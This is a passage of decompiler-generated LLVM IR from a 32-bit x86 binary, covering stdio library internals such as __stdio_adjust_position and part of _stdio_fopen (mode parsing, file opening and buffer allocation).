  br label %dec_label_pc_80573b4

dec_label_pc_80573b1:                             ; preds = %dec_label_pc_8057377, %dec_label_pc_8057363, %dec_label_pc_805734e
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80573b4

dec_label_pc_80573b4:                             ; preds = %dec_label_pc_805738b, %dec_label_pc_80573b1
  br i1 %v1_8057328, label %dec_label_pc_80573c9, label %dec_label_pc_80573b8

dec_label_pc_80573b8:                             ; preds = %dec_label_pc_80573b4
  %v2_80573bc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80573bc, i32* @eax, align 4
  %v3_80573c1 = call i32 @__pthread_return_void(i32 %v2_80573bc, i32 1)
  store i32 %v3_80573c1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80573c9

dec_label_pc_80573c9:                             ; preds = %dec_label_pc_80573b4, %dec_label_pc_8057310, %dec_label_pc_80573b8
  %v0_80573cc = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80573cc, i32* %eax.global-to-local, align 4
  store i32 %v0_80572ef, i32* @ebx, align 4
  store i32 %v0_80572ee, i32* @esi, align 4
  store i32 %v0_80572ed, i32* @edi, align 4
  store i32 %v0_80572ec, i32* @ebp, align 4
  ret i32 %v0_80573cc

; uselistorder directives
  uselistorder i32 %v2_8057379.pre-phi, { 1, 0 }
  uselistorder i32 %v0_805735e, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80573c9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80573b4, { 1, 0 }
  uselistorder label %dec_label_pc_8057377, { 1, 0 }
  uselistorder label %dec_label_pc_8057349, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_80573dc = ptrtoint i16* %arg1 to i32
  store i32 %v4_80573dc, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_80573e4 = load i16, i16* %arg1, align 2
  %v3_80573e4 = zext i16 %v2_80573e4 to i32
  store i32 %v3_80573e4, i32* %ecx.global-to-local, align 4
  %tmp = urem i16 %v2_80573e4, 4
  %v1_80573e9 = zext i16 %tmp to i32
  %v2_80573e9 = icmp eq i16 %tmp, 0
  br i1 %v2_80573e9, label %dec_label_pc_8057418, label %dec_label_pc_80573ee

dec_label_pc_80573ee:                             ; preds = %entry
  %v1_80573f0 = add nsw i32 %v1_80573e9, -1
  %v8_80573f0 = icmp eq i32 %v1_80573f0, 0
  store i32 %v1_80573f0, i32* @edx, align 4
  br i1 %v8_80573f0, label %dec_label_pc_8057418, label %dec_label_pc_80573f3

dec_label_pc_80573f3:                             ; preds = %dec_label_pc_80573ee
  %v3_80573f3 = and i32 %v3_80573e4, 2048
  %v4_80573f3 = icmp eq i32 %v3_80573f3, 0
  br i1 %v4_80573f3, label %dec_label_pc_8057418, label %dec_label_pc_80573f8

dec_label_pc_80573f8:                             ; preds = %dec_label_pc_80573f3
  %v6_80573f8 = sub nsw i32 1, %v1_80573e9
  %v7_80573f8 = and i32 %v1_80573f0, %v6_80573f8
  %v8_80573f8 = icmp slt i32 %v7_80573f8, 0
  %v9_80573f8 = icmp eq i16 %tmp, 2
  %v10_80573f8 = icmp ult i16 %tmp, 2
  %v3_80573fb = icmp eq i1 %v10_80573f8, %v8_80573f8
  %v4_80573fb = icmp eq i1 %v9_80573f8, false
  %v5_80573fb = and i1 %v4_80573fb, %v3_80573fb
  br i1 %v5_80573fb, label %dec_label_pc_805746c, label %dec_label_pc_80573fd

dec_label_pc_80573fd:                             ; preds = %dec_label_pc_80573f8
  %v1_80573fd = add i32 %v4_80573dc, 40
  %v2_80573fd = inttoptr i32 %v1_80573fd to i32*
  %v3_80573fd = load i32, i32* %v2_80573fd, align 4
  %v4_80573fd = icmp eq i32 %v3_80573fd, 0
  %v1_8057401 = icmp eq i1 %v4_80573fd, false
  br i1 %v1_8057401, label %dec_label_pc_805746c, label %dec_label_pc_8057403

dec_label_pc_8057403:                             ; preds = %dec_label_pc_80573fd
  %v1_8057403 = add i32 %v4_80573dc, 3
  %v2_8057403 = inttoptr i32 %v1_8057403 to i8*
  %v3_8057403 = load i8, i8* %v2_8057403, align 1
  %v4_8057403 = zext i8 %v3_8057403 to i32
  %v2_8057407 = sub nsw i32 %v1_80573f0, %v4_8057403
  %v1_8057409 = add i32 %v4_80573dc, 44
  %v2_8057409 = inttoptr i32 %v1_8057409 to i32*
  %v3_8057409 = load i32, i32* %v2_8057409, align 4
  %v1_805740d = add nsw i32 %v2_8057407, -1
  %tmp11 = icmp slt i32 %v3_8057409, 1
  br i1 %tmp11, label %dec_label_pc_8057418, label %dec_label_pc_8057412

dec_label_pc_8057412:                             ; preds = %dec_label_pc_8057403
  %v1_8057412 = add i32 %v4_80573dc, 2
  %v2_8057412 = inttoptr i32 %v1_8057412 to i8*
  %v3_8057412 = load i8, i8* %v2_8057412, align 1
  %v4_8057412 = zext i8 %v3_8057412 to i32
  %v2_8057416 = sub nsw i32 %v1_805740d, %v4_8057412
  br label %dec_label_pc_8057418

dec_label_pc_8057418:                             ; preds = %dec_label_pc_8057403, %dec_label_pc_80573f3, %dec_label_pc_80573ee, %entry, %dec_label_pc_8057412
  %v0_805742d = phi i32 [ %v1_805740d, %dec_label_pc_8057403 ], [ %v1_80573f0, %dec_label_pc_80573f3 ], [ 0, %dec_label_pc_80573ee ], [ 0, %entry ], [ %v2_8057416, %dec_label_pc_8057412 ]
  %v2_8057418 = and i32 %v3_80573e4, 64
  %v3_8057418 = icmp eq i32 %v2_8057418, 0
  %storemerge.in.in.v = select i1 %v3_8057418, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_80573dc
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8057425 = add i32 %v4_80573dc, 16
  %v3_8057425 = inttoptr i32 %v2_8057425 to i32*
  %v4_8057425 = load i32, i32* %v3_8057425, align 4
  %v5_8057425 = sub i32 %storemerge, %v4_8057425
  %v1_8057428 = inttoptr i32 %arg2 to i32*
  %v2_8057428 = load i32, i32* %v1_8057428, align 4
  store i32 %v2_8057428, i32* %ecx.global-to-local, align 4
  %v1_805742a = add i32 %arg2, 4
  %v2_805742a = inttoptr i32 %v1_805742a to i32*
  %v3_805742a = load i32, i32* %v2_805742a, align 4
  store i32 %v3_805742a, i32* %ebx.global-to-local, align 4
  %v2_805742d = add i32 %v5_8057425, %v0_805742d
  store i32 %v2_805742d, i32* %esi.global-to-local, align 4
  %v5_8057441 = sub i32 %v2_8057428, %v2_805742d
  %v10_8057441 = icmp ult i32 %v2_8057428, %v2_805742d
  %v6_8057445 = zext i1 %v10_8057441 to i32
  %tmp13 = icmp slt i32 %v2_805742d, 0
  %v2_8057432.neg = zext i1 %tmp13 to i32
  %v7_8057445 = add i32 %v3_805742a, %v2_8057432.neg
  %v8_8057445 = add i32 %v7_8057445, %v6_8057445
  store i32 %v8_8057445, i32* @edx, align 4
  store i32 %v5_8057441, i32* %v1_8057428, align 4
  %v0_805744b = load i32, i32* @edx, align 4
  %v1_805744b = load i32, i32* %edi.global-to-local, align 4
  %v2_805744b = add i32 %v1_805744b, 4
  %v3_805744b = inttoptr i32 %v2_805744b to i32*
  store i32 %v0_805744b, i32* %v3_805744b, align 4
  %v0_805744e = load i32, i32* %edi.global-to-local, align 4
  %v1_805744e = add i32 %v0_805744e, 4
  %v2_805744e = inttoptr i32 %v1_805744e to i32*
  %v3_805744e = load i32, i32* %v2_805744e, align 4
  %v4_805744e = load i32, i32* %ebx.global-to-local, align 4
  %v5_8057451 = icmp slt i32 %v3_805744e, %v4_805744e
  br i1 %v5_8057451, label %dec_label_pc_805745b, label %dec_label_pc_8057453

dec_label_pc_8057453:                             ; preds = %dec_label_pc_8057418
  %v8_8057453 = icmp sgt i32 %v3_805744e, %v4_805744e
  br i1 %v8_8057453, label %dec_label_pc_8057459, label %dec_label_pc_8057455

dec_label_pc_8057455:                             ; preds = %dec_label_pc_8057453
  %v1_8057455 = inttoptr i32 %v0_805744e to i32*
  %v2_8057455 = load i32, i32* %v1_8057455, align 4
  %v3_8057455 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_8057455, %v3_8057455
  br i1 %tmp14, label %dec_label_pc_8057459, label %dec_label_pc_805745b

dec_label_pc_8057459:                             ; preds = %dec_label_pc_8057455, %dec_label_pc_8057453
  %v0_8057459 = load i32, i32* %esi.global-to-local, align 4
  %v1_8057459 = sub i32 0, %v0_8057459
  store i32 %v1_8057459, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805745b

dec_label_pc_805745b:                             ; preds = %dec_label_pc_8057455, %dec_label_pc_8057418, %dec_label_pc_8057459
  %v0_805745b = load i32, i32* %esi.global-to-local, align 4
  %v2_805745b = icmp slt i32 %v0_805745b, 0
  %v1_805745d = icmp eq i1 %v2_805745b, false
  br i1 %v1_805745d, label %dec_label_pc_805746f, label %dec_label_pc_805745f

dec_label_pc_805745f:                             ; preds = %dec_label_pc_805745b
  %v1_805745f = call i32 @__errno_location(i32 %v2_805742d)
  %v1_8057464 = inttoptr i32 %v1_805745f to i32*
  store i32 75, i32* %v1_8057464, align 4
  %v0_8057472.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805746f

dec_label_pc_805746c:                             ; preds = %dec_label_pc_80573fd, %dec_label_pc_80573f8
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805746f

dec_label_pc_805746f:                             ; preds = %dec_label_pc_805745b, %dec_label_pc_805745f, %dec_label_pc_805746c
  %v0_8057472 = phi i32 [ %v0_805745b, %dec_label_pc_805745b ], [ %v0_8057472.pre, %dec_label_pc_805745f ], [ -1, %dec_label_pc_805746c ]
  ret i32 %v0_8057472

; uselistorder directives
  uselistorder i32 %v4_805744e, { 1, 0 }
  uselistorder i32 %v3_805744e, { 1, 0 }
  uselistorder i32 %v2_805742d, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_80573f0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_80573dc, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 75, { 3, 2, 1, 0 }
  uselistorder i32 2048, { 3, 0, 4, 1, 2, 8, 9, 7, 10, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805746f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805745b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057418, { 4, 0, 1, 2, 3 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8057478 = load i32, i32* @ebp, align 4
  %v0_8057479 = load i32, i32* @edi, align 4
  %v0_805747a = load i32, i32* @esi, align 4
  %v0_805747b = load i32, i32* @ebx, align 4
  store i32 %v0_805747b, i32* %stack_var_-16, align 4
  %v4_805747f = ptrtoint i8* %arg2 to i32
  store i32 %v4_805747f, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_805748f = load i8, i8* %arg2, align 1
  %v3_805748f = zext i8 %v2_805748f to i32
  %v4_805748f = load i32, i32* @eax, align 4
  %v5_805748f = and i32 %v4_805748f, -256
  %v6_805748f = or i32 %v5_805748f, %v3_805748f
  store i32 %v6_805748f, i32* %eax.global-to-local, align 4
  %v10_8057491 = icmp eq i8 %v2_805748f, 114
  br i1 %v10_8057491, label %dec_label_pc_80574d3, label %dec_label_pc_8057495

dec_label_pc_8057495:                             ; preds = %entry
  %v10_8057495 = icmp eq i8 %v2_805748f, 119
  store i32 577, i32* @ebx, align 4
  br i1 %v10_8057495, label %dec_label_pc_80574d5, label %dec_label_pc_805749e

dec_label_pc_805749e:                             ; preds = %dec_label_pc_8057495
  %v10_805749e = icmp eq i8 %v2_805748f, 97
  store i32 1089, i32* @ebx, align 4
  br i1 %v10_805749e, label %dec_label_pc_80574d5, label %dec_label_pc_80574a6

dec_label_pc_80574a6:                             ; preds = %dec_label_pc_805754e, %dec_label_pc_8057528, %dec_label_pc_805749e
  %v0_80574a6 = load i32, i32* %stack_var_-16, align 4
  %v1_80574a6 = call i32 @__errno_location(i32 %v0_80574a6)
  store i32 %v1_80574a6, i32* %eax.global-to-local, align 4
  %v0_80574ab = load i32, i32* @ebp, align 4
  %v1_80574ab = icmp eq i32 %v0_80574ab, 0
  %v1_80574ad = inttoptr i32 %v1_80574a6 to i32*
  store i32 22, i32* %v1_80574ad, align 4
  br i1 %v1_80574ab, label %dec_label_pc_80576af, label %dec_label_pc_80574b9

dec_label_pc_80574b9:                             ; preds = %dec_label_pc_8057571, %dec_label_pc_80574a6
  %v0_80574b9 = load i32, i32* @ebp, align 4
  %v1_80574b9 = add i32 %v0_80574b9, 1
  %v2_80574b9 = inttoptr i32 %v1_80574b9 to i8*
  %v3_80574b9 = load i8, i8* %v2_80574b9, align 1
  %v4_80574b9 = and i8 %v3_80574b9, 32
  %v5_80574b9 = icmp eq i8 %v4_80574b9, 0
  br i1 %v5_80574b9, label %dec_label_pc_80576af, label %dec_label_pc_80574c3

dec_label_pc_80574c3:                             ; preds = %dec_label_pc_80574b9
  store i32 %v0_80574b9, i32* %stack_var_-76, align 4
  store i32 0, i32* @ebp, align 4
  %v1_80574c9 = call i32 @free(i32 %v0_80574b9)
  br label %dec_label_pc_80576aa

dec_label_pc_80574d3:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80574d5

dec_label_pc_80574d5:                             ; preds = %dec_label_pc_805749e, %dec_label_pc_8057495, %dec_label_pc_80574d3
  %v0_80574e6 = phi i32 [ 1089, %dec_label_pc_805749e ], [ 577, %dec_label_pc_8057495 ], [ 0, %dec_label_pc_80574d3 ]
  %v1_80574d5 = add i32 %v4_805747f, 1
  %v2_80574d5 = inttoptr i32 %v1_80574d5 to i8*
  %v3_80574d5 = load i8, i8* %v2_80574d5, align 1
  %v12_80574d5 = icmp eq i8 %v3_80574d5, 98
  %v1_80574d5.v4_805747f = select i1 %v12_80574d5, i32 %v1_80574d5, i32 %v4_805747f
  store i32 %v1_80574d5.v4_805747f, i32* %eax.global-to-local, align 4
  %v1_80574e0 = add i32 %v1_80574d5.v4_805747f, 1
  %v2_80574e0 = inttoptr i32 %v1_80574e0 to i8*
  %v3_80574e0 = load i8, i8* %v2_80574e0, align 1
  %v12_80574e0 = icmp eq i8 %v3_80574e0, 43
  %v1_80574e4 = icmp eq i1 %v12_80574e0, false
  br i1 %v1_80574e4, label %dec_label_pc_80574ee, label %dec_label_pc_80574e6

dec_label_pc_80574e6:                             ; preds = %dec_label_pc_80574d5
  %v1_80574e8 = or i32 %v0_80574e6, 1
  store i32 %v1_80574e8, i32* %eax.global-to-local, align 4
  %v1_80574eb = add nuw nsw i32 %v1_80574e8, 1
  store i32 %v1_80574eb, i32* @ebx, align 4
  br label %dec_label_pc_80574ee

dec_label_pc_80574ee:                             ; preds = %dec_label_pc_80574d5, %dec_label_pc_80574e6
  %v0_80575717 = phi i32 [ %v0_80574e6, %dec_label_pc_80574d5 ], [ %v1_80574eb, %dec_label_pc_80574e6 ]
  %v1_80574ee = icmp eq i32 %arg3, 0
  %v1_80574f0 = icmp eq i1 %v1_80574ee, false
  br i1 %v1_80574f0, label %dec_label_pc_8057524, label %dec_label_pc_80574f2

dec_label_pc_80574f2:                             ; preds = %dec_label_pc_80574ee
  store i32 80, i32* %stack_var_-76, align 4
  %v1_80574f7 = call i32 @malloc(i32 80)
  store i32 %v1_80574f7, i32* %eax.global-to-local, align 4
  %v2_80574ff = icmp eq i32 %v1_80574f7, 0
  store i32 %v1_80574f7, i32* @ebp, align 4
  br i1 %v2_80574ff, label %dec_label_pc_80576b1, label %dec_label_pc_8057509

dec_label_pc_8057509:                             ; preds = %dec_label_pc_80574f2
  %v2_80574f7 = inttoptr i32 %v1_80574f7 to i16*
  store i16 8192, i16* %v2_80574f7, align 2
  %v2_8057511 = add i32 %v1_80574f7, 8
  %v3_8057511 = inttoptr i32 %v2_8057511 to i32*
  store i32 0, i32* %v3_8057511, align 4
  %v2_8057518 = add i32 %v1_80574f7, 56
  store i32 %v2_8057518, i32* %eax.global-to-local, align 4
  store i32 %v2_8057518, i32* %stack_var_-76, align 4
  %v1_805751c = call i32 @__stdio_init_mutex(i32 %v2_8057518)
  store i32 %v1_805751c, i32* %eax.global-to-local, align 4
  %v0_8057571.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8057524

dec_label_pc_8057524:                             ; preds = %dec_label_pc_80574ee, %dec_label_pc_8057509
  %v2_8057577 = phi i32 [ %v0_80575717, %dec_label_pc_80574ee ], [ %v0_8057571.pre, %dec_label_pc_8057509 ]
  %v2_8057524 = icmp slt i32 %arg4, 0
  br i1 %v2_8057524, label %dec_label_pc_8057571, label %dec_label_pc_8057528

dec_label_pc_8057528:                             ; preds = %dec_label_pc_8057524
  %v1_805752a = and i32 %v2_8057577, 32771
  %v1_8057530 = add nuw nsw i32 %v1_805752a, 1
  store i32 %v1_8057530, i32* @edx, align 4
  %v0_8057531 = load i32, i32* @esi, align 4
  %v1_8057531 = add i32 %v0_8057531, 1
  %v2_8057534 = and i32 %v1_8057531, %v1_8057530
  store i32 %v2_8057534, i32* %eax.global-to-local, align 4
  %v12_8057536 = icmp eq i32 %v2_8057534, %v1_8057530
  %v1_8057538 = load i32, i32* @ebp, align 4
  %v2_8057538 = add i32 %v1_8057538, 4
  %v3_8057538 = inttoptr i32 %v2_8057538 to i32*
  store i32 %arg4, i32* %v3_8057538, align 4
  %v1_805753b = icmp eq i1 %v12_8057536, false
  br i1 %v1_805753b, label %dec_label_pc_80574a6, label %dec_label_pc_8057541

dec_label_pc_8057541:                             ; preds = %dec_label_pc_8057528
  %v0_8057541 = load i32, i32* @esi, align 4
  %v1_8057543 = and i32 %v0_8057541, 1024
  %v1_8057545 = xor i32 %v1_8057543, 1024
  store i32 %v1_8057545, i32* %eax.global-to-local, align 4
  %v1_805754a = load i32, i32* @ebx, align 4
  %v2_805754a = and i32 %v1_805754a, %v1_8057545
  %v3_805754a = icmp eq i32 %v2_805754a, 0
  br i1 %v3_805754a, label %dec_label_pc_8057541.dec_label_pc_8057567_crit_edge, label %dec_label_pc_805754e

dec_label_pc_8057541.dec_label_pc_8057567_crit_edge: ; preds = %dec_label_pc_8057541
  br label %dec_label_pc_8057567

dec_label_pc_805754e:                             ; preds = %dec_label_pc_8057541
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_8057557 = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_8057557, i32* %eax.global-to-local, align 4
  %v1_805755f = icmp eq i32 %v3_8057557, 0
  %v1_8057561 = icmp eq i1 %v1_805755f, false
  br i1 %v1_8057561, label %dec_label_pc_80574a6, label %dec_label_pc_805754e.dec_label_pc_8057567_crit_edge

dec_label_pc_805754e.dec_label_pc_8057567_crit_edge: ; preds = %dec_label_pc_805754e
  %v0_8057567.pre = load i32, i32* @esi, align 4
  %v0_805756d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8057567

dec_label_pc_8057567:                             ; preds = %dec_label_pc_8057541.dec_label_pc_8057567_crit_edge, %dec_label_pc_805754e.dec_label_pc_8057567_crit_edge
  %v0_805756d = phi i32 [ %v1_805754a, %dec_label_pc_8057541.dec_label_pc_8057567_crit_edge ], [ %v0_805756d.pre, %dec_label_pc_805754e.dec_label_pc_8057567_crit_edge ]
  %v0_8057567 = phi i32 [ %v0_8057541, %dec_label_pc_8057541.dec_label_pc_8057567_crit_edge ], [ %v0_8057567.pre, %dec_label_pc_805754e.dec_label_pc_8057567_crit_edge ]
  %v1_8057567 = and i32 %v0_8057567, 32768
  %v2_805756d = or i32 %v1_8057567, %v0_805756d
  store i32 %v2_805756d, i32* @ebx, align 4
  br label %dec_label_pc_8057595

dec_label_pc_8057571:                             ; preds = %dec_label_pc_8057524
  %v11_8057573 = or i32 %v2_8057577, 32768
  store i32 %v11_8057573, i32* %eax.global-to-local, align 4
  %v1_8057576 = add i32 %arg4, 1
  %v8_8057576 = icmp eq i32 %v1_8057576, 0
  store i32 %v1_8057576, i32* @edi, align 4
  %v1_8057577 = icmp eq i1 %v8_8057576, false
  %v4_8057577 = select i1 %v1_8057577, i32 %v11_8057573, i32 %v2_8057577
  store i32 %v4_8057577, i32* @ebx, align 4
  %v0_8057581 = load i32, i32* @esi, align 4
  store i32 %v0_8057581, i32* %stack_var_-76, align 4
  %v3_8057582 = inttoptr i32 %v0_8057581 to i8*
  %v4_8057582 = call i32 @__libc_open(i8* %v3_8057582, i32 %v4_8057577)
  store i32 %v4_8057582, i32* %eax.global-to-local, align 4
  %v2_805758a = icmp slt i32 %v4_8057582, 0
  %v1_805758c = load i32, i32* @ebp, align 4
  %v2_805758c = add i32 %v1_805758c, 4
  %v3_805758c = inttoptr i32 %v2_805758c to i32*
  store i32 %v4_8057582, i32* %v3_805758c, align 4
  br i1 %v2_805758a, label %dec_label_pc_80574b9, label %dec_label_pc_8057595

dec_label_pc_8057595:                             ; preds = %dec_label_pc_8057571, %dec_label_pc_8057567
  %v0_8057595 = load i32, i32* @ebp, align 4
  %v1_8057595 = inttoptr i32 %v0_8057595 to i32*
  %v2_8057595 = load i32, i32* %v1_8057595, align 4
  %v2_8057595.tr = trunc i32 %v2_8057595 to i16
  %v1_805759d = and i16 %v2_8057595.tr, 8192
  %v3_805759d = inttoptr i32 %v0_8057595 to i16*
  store i16 %v1_805759d, i16* %v3_805759d, align 2
  %v0_80575a1 = load i32, i32* @ebx, align 4
  store i32 %v0_80575a1, i32* %eax.global-to-local, align 4
  %v1_80575a3 = and i32 %v0_80575a1, -31744
  %v0_80575a9 = load i32, i32* @ebp, align 4
  %v1_80575a9 = inttoptr i32 %v0_80575a9 to i32*
  %v2_80575a9 = load i32, i32* %v1_80575a9, align 4
  %v1_80575ac = mul i32 %v0_80575a1, 16
  %v1_80575af = and i32 %v1_80575ac, 48
  %v1_80575b0 = add nuw nsw i32 %v1_80575af, 16
  %v2_80575b3 = xor i32 %v1_80575b0, 48
  %v2_80575b6 = or i32 %v2_80575a9, %v1_80575a3
  %v2_80575b8 = or i32 %v2_80575b6, %v2_80575b3
  store i32 %v2_80575b8, i32* %eax.global-to-local, align 4
  %v1_80575ba = trunc i32 %v2_80575b8 to i16
  %v3_80575ba = inttoptr i32 %v0_80575a9 to i16*
  store i16 %v1_80575ba, i16* %v3_80575ba, align 2
  %v0_80575be = load i32, i32* %stack_var_-76, align 4
  %v1_80575be = call i32 @__errno_location(i32 %v0_80575be)
  store i32 %v1_80575be, i32* %eax.global-to-local, align 4
  %v0_80575c6 = load i32, i32* @ebp, align 4
  %v1_80575c6 = inttoptr i32 %v0_80575c6 to i16*
  %v2_80575c6 = load i16, i16* %v1_80575c6, align 2
  %v3_80575c6 = zext i16 %v2_80575c6 to i32
  store i32 %v3_80575c6, i32* @ebx, align 4
  %v1_80575ca = inttoptr i32 %v1_80575be to i32*
  %v2_80575ca = load i32, i32* %v1_80575ca, align 4
  store i32 %v2_80575ca, i32* @edi, align 4
  store i32 %v1_80575be, i32* @esi, align 4
  %v1_80575ce = add i32 %v0_80575c6, 4
  %v2_80575ce = inttoptr i32 %v1_80575ce to i32*
  %v3_80575ce = load i32, i32* %v2_80575ce, align 4
  store i32 %v3_80575ce, i32* %stack_var_-76, align 4
  %v1_80575d1 = call i32 @isatty(i32 %v3_80575ce)
  %v2_80575d9 = mul i32 %v1_80575d1, 256
  store i32 %v2_80575d9, i32* %eax.global-to-local, align 4
  %v0_80575dc = load i32, i32* @ebx, align 4
  %v2_80575dc = or i32 %v0_80575dc, %v2_80575d9
  store i32 %v2_80575dc, i32* @ebx, align 4
  %v1_80575de = trunc i32 %v2_80575dc to i16
  %v2_80575de = load i32, i32* @ebp, align 4
  %v3_80575de = inttoptr i32 %v2_80575de to i16*
  store i16 %v1_80575de, i16* %v3_80575de, align 2
  %v0_80575e2 = load i32, i32* @edi, align 4
  %v1_80575e2 = load i32, i32* @esi, align 4
  %v2_80575e2 = inttoptr i32 %v1_80575e2 to i32*
  store i32 %v0_80575e2, i32* %v2_80575e2, align 4
  %v0_80575e4 = load i32, i32* @ebp, align 4
  %v1_80575e4 = add i32 %v0_80575e4, 8
  %v2_80575e4 = inttoptr i32 %v1_80575e4 to i32*
  %v3_80575e4 = load i32, i32* %v2_80575e4, align 4
  %v4_80575e4 = icmp eq i32 %v3_80575e4, 0
  %v1_80575e8 = icmp eq i1 %v4_80575e4, false
  br i1 %v1_80575e8, label %dec_label_pc_805761c, label %dec_label_pc_80575ea

dec_label_pc_80575ea:                             ; preds = %dec_label_pc_8057595
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_80575f2 = call i32 @malloc(i32 4096)
  store i32 %v1_80575f2, i32* %eax.global-to-local, align 4
  %v1_80575fa = icmp eq i32 %v1_80575f2, 0
  %v1_80575fc = load i32, i32* @ebp, align 4
  %v2_80575fc = add i32 %v1_80575fc, 8
  %v3_80575fc = inttoptr i32 %v2_80575fc to i32*
  store i32 %v1_80575f2, i32* %v3_80575fc, align 4
  br i1 %v1_80575fa, label %dec_label_pc_8057615, label %dec_label_pc_8057601

dec_label_pc_8057601:                             ; preds = %dec_label_pc_80575ea
  %v1_8057601 = add i32 %v1_80575f2, 4096
  store i32 %v1_8057601, i32* %eax.global-to-local, align 4
  %v1_8057606 = load i32, i32* @ebp, align 4
  %v2_8057606 = add i32 %v1_8057606, 12
  %v3_8057606 = inttoptr i32 %v2_8057606 to i32*
  store i32 %v1_8057601, i32* %v3_8057606, align 4
  %v0_8057609 = load i32, i32* @ebp, align 4
  %v1_8057609 = inttoptr i32 %v0_8057609 to i32*
  %v2_8057609 = load i32, i32* %v1_8057609, align 4
  %v1_805760c = udiv i32 %v2_8057609, 256
  %v3_805760c = and i32 %v1_805760c, 191
  %v8_805760c = or i32 %v3_805760c, 64
  %v10_805760c = mul nuw nsw i32 %v8_805760c, 256
  %v11_805760c = and i32 %v2_8057609, -65281
  %v12_805760c = or i32 %v10_805760c, %v11_805760c
  store i32 %v12_805760c, i32* %eax.global-to-local, align 4
  %v1_805760f = trunc i32 %v12_805760c to i16
  %v3_805760f = inttoptr i32 %v0_8057609 to i16*
  store i16 %v1_805760f, i16* %v3_805760f, align 2
  br label %dec_label_pc_805761c

dec_label_pc_8057615:                             ; preds = %dec_label_pc_80575ea
  %v0_8057615 = load i32, i32* @ebp, align 4
  %v1_8057615 = add i32 %v0_8057615, 12
  %v2_8057615 = inttoptr i32 %v1_8057615 to i32*
  store i32 0, i32* %v2_8057615, align 4
  br label %dec_label_pc_805761c

dec_label_pc_805761c:                             ; preds = %dec_label_pc_8057595, %dec_label_pc_8057601, %dec_label_pc_8057615
  %v0_805761c = load i32, i32* @ebp, align 4
  %v1_805761c = add i32 %v0_805761c, 8
  %v2_805761c = inttoptr i32 %v1_805761c to i32*
  %v3_805761c = load i32, i32* %v2_805761c, align 4
  store i32 %v3_805761c, i32* %eax.global-to-local, align 4
  %v1_805761f = add i32 %v0_805761c, 2
  %v2_805761f = inttoptr i32 %v1_805761f to i8*
  store i8 0, i8* %v2_805761f, align 1
  %v0_8057623 = load i32, i32* @ebp, align 4
  %v1_8057623 = add i32 %v0_8057623, 44
  %v2_8057623 = inttoptr i32 %v1_8057623 to i32*
  store i32 0, i32* %v2_8057623, align 4
  %v0_805762a = load i32, i32* @ebp, align 4
  %v1_805762a = add i32 %v0_805762a, 1
  %v2_805762a = inttoptr i32 %v1_805762a to i8*
  %v3_805762a = load i8, i8* %v2_805762a, align 1
  %v4_805762a = and i8 %v3_805762a, 32
  %v5_805762a = icmp eq i8 %v4_805762a, 0
  %v0_805762e = load i32, i32* %eax.global-to-local, align 4
  %v2_805762e = add i32 %v0_805762a, 24
  %v3_805762e = inttoptr i32 %v2_805762e to i32*
  store i32 %v0_805762e, i32* %v3_805762e, align 4
  %v0_8057631 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057631 = load i32, i32* @ebp, align 4
  %v2_8057631 = add i32 %v1_8057631, 28
  %v3_8057631 = inttoptr i32 %v2_8057631 to i32*
  store i32 %v0_8057631, i32* %v3_8057631, align 4
  %v0_8057634 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057634 = load i32, i32* @ebp, align 4
  %v2_8057634 = add i32 %v1_8057634, 16
  %v3_8057634 = inttoptr i32 %v2_8057634 to i32*
  store i32 %v0_8057634, i32* %v3_8057634, align 4
  %v0_8057637 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057637 = load i32, i32* @ebp, align 4
  %v2_8057637 = add i32 %v1_8057637, 20
  %v3_8057637 = inttoptr i32 %v2_8057637 to i32*
  store i32 %v0_8057637, i32* %v3_8057637, align 4
  %v0_805763a = load i32, i32* @global_var_805f290.1031, align 16
